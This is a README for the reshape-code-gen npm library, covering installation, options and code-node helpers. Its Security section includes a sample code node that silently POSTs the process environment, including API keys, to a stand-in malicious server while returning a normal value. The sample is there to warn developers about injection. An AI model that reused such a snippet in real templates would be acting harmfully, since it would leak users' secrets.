# Reshape Code Generator

[![npm](https://img.shields.io/npm/v/reshape-code-gen.svg?style=flat-square)](https://npmjs.com/package/reshape-code-gen)
[![tests](https://img.shields.io/travis/reshape/code-gen.svg?style=flat-square)](https://travis-ci.org/reshape/code-gen?branch=master)
[![dependencies](https://img.shields.io/david/reshape/code-gen.svg?style=flat-square)](https://david-dm.org/reshape/code-gen)
[![coverage](https://img.shields.io/coveralls/reshape/code-gen.svg?style=flat-square)](https://coveralls.io/r/reshape/code-gen?branch=master)

Convert a Reshape AST into a Javascript function

> **Note:** This project is in early development, and versioning is a little different. [Read this](http://markup.im/#q4_cRZ1Q) for more details.

### Installation

`npm install reshape-code-gen -S`

> **Note:** This project is compatible with node v6+ only

### Usage

Usage is very straightforward. Just require the library and pass it a reshape AST, and it will return a function as a string. When you call the function, it will return the resulting html as a string.

```js
const generate = require('reshape-code-gen')

const tpl = generate([
  { type: 'string', content: 'hello ', line: 1, col: 1 },
  { type: 'code', value: 'planet', line: 1, col: 7 }
], {/* options */})

tpl({ planet: 'world' }) // 'hello world'
```

### Options

| Name | Description | Default |
| ---- | ----------- | ------- |
| **selfClosing** | style for handling self-closing tags. can be `slash` (`<br />`), `tag` (`<br></br>`), or `close` (`<br>`) | `close` |
| **runtimeName** | custom name for the runtime object | `__runtime` |
| **returnString** | gives back a string instead of a function | `false` |
| **scopedLocals** | use `locals.foo` instead of `foo` in code nodes. this will speed up compile time, but be less pretty | `false`

### Code Block Helpers

Within the `content` of a `code` node, there are two special helpers that can be used:

#### `__nodes`

A helper that can be used inside of a `code` node's content in order to inject an already-generated AST. For example:

```js
{
  type: 'code',
  content: 'foo === "bar" ? __nodes[0] : __nodes[1]',
  nodes: [
    { type: 'text', content: 'truth' },
    { type: 'text', content: 'lies' }
  ]
}
```

The `__nodes` helper is an array, and you can use the `nodes` property to hold on to values. Values can be a single node or a full tree, they will be evaluated, and the result will be substituted in where the `__nodes` marker is.

####  `__runtime`

This helper can be used to access any functions on the runtime object. It will work under the same name whether the user has changed the runtime name via the options or not. For example:

```js
{
  type: 'code',
  content: '__runtime.escape(foo)'
}
```

### Security

Please note that this library produces a function as its output that could be influenced by user input and will most likely run inside your application environment. While the default output is evaluated in a [sandbox](https://nodejs.org/api/vm.html), when the function is executed it will have full access to any part of your code's environment, as all functions do.

Chances are that any `code` nodes in your templates are your own code, probably for evaluating a local variable. However, if any type of outside user input is accepted and evaluated as a `code` node, or if a malicious plugin is being used, you have a serious security vulnerability on your hands. This is especially the case when using the `outputString` option and executing templates client-side. Keep in mind that it is also possible for plugins to contain malicious code, so be sure that you trust and have evaluated the source of any plugins you are using.

Here's an example of how a `code` node could be used to compromise your secure information:

```js
{
  type: 'code',
  content: `
    (function () {
      const http = require(\'http\')
      const req = http.request({
        hostname: 'http://malicious-server.com',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      })
      req.write(JSON.stringify(process.env))
      req.end()
      return foo
    })()
  `
}
```

In this example, the code node will return `foo` from your local variables as if all is well, but in the background will send the contents of your environment, which often includes private API keys and such, to a malicious server. This example would work in node, but it would also be simple to add a version that would work in the browser, or even both, with an environment check. And this is a very tame example as well, arbitrarily injected code could easily be used to get or delete your database's contents, make financial transactions, conduct actions as a logged-in user, etc.

While a situation like this is unlikely to happen, and all core plugins protect against it as much as possible, it is still something to keep in mind. _Especially_ if there is any user input inserted into your templates that could be potentially evaluated as code and not as a string.

### License & Contributing

- Details on the license [can be found here](LICENSE.md)
- Details on running tests and contributing [can be found here](contributing.md)
